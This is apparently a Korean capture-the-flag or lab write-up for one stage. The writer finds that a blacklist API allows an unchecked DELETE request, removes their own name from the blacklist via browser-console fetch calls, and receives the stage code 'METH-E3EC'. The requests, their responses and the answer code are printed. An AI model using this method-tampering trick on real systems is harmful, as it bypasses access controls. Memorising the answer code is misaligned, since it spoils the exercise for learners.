# 23. 지울 수 있는 이름

- 힌트: 읽을 수 있는 목록이면, 지울 수도 있는지 물어봐.

## 관찰

화면에 다음 세 줄이 표시된다.

```
name: 신예준A
blacklist: BLOCKED
gate: BLACKLISTED
```

## 확인 과정

스크립트(`/stages/s27/script.js`)를 확인하면 다음과 같이 되어 있었다(코드 안 주석도 그대로 남아있었다).

```js
// 내 블랙리스트 항목을 읽기만 한다 — 지우는 요청은 학습자가 직접 보낸다.
const me = await (await fetch('/api/me')).json();
const entry = await (await fetch(`/api/blacklist/${encodeURIComponent(me.name)}`)).json();
const gate = await (await fetch('/api/gate')).json();
```

즉 페이지는 내 블랙리스트 상태를 조회(GET)만 할 뿐, 삭제는 절대 스스로 하지 않는다. 이 리소스에 삭제(DELETE) 메서드도 열려 있는지 직접 확인해봤다.

이때 이 사이트의 로그인 세션은 `document.cookie`로는 보이지 않는 httpOnly 쿠키로 관리되고 있어서, 터미널의 curl은 이 쿠키를 갖고 있지 않아 인증이 필요한 요청에서 계속 실패했다(`{"ok":false}` / `401`). 반면 브라우저 탭 안에서 직접 `fetch`를 실행하면 이 httpOnly 세션 쿠키가 요청에 자동으로 실린다. 그래서 인증이 필요한 이 단계부터는 브라우저 콘솔에서 직접 요청을 보냈다.

```js
await (await fetch('/api/me')).json();
// {"ok":true,"name":"신예준A","furthest":22,"reached":23,"total":30}

await (await fetch('/api/blacklist/' + encodeURIComponent('신예준A'), { method:'DELETE' })).json();
// {"name":"신예준A","blocked":false}

await (await fetch('/api/gate')).json();
// {"ok":true,"code":"METH-E3EC"}
```

목록 조회용으로만 열어둔 리소스에 삭제 메서드까지 그대로 열려 있어서, 내 이름을 블랙리스트에서 직접 지울 수 있었다.

## 코드

`METH-E3EC`
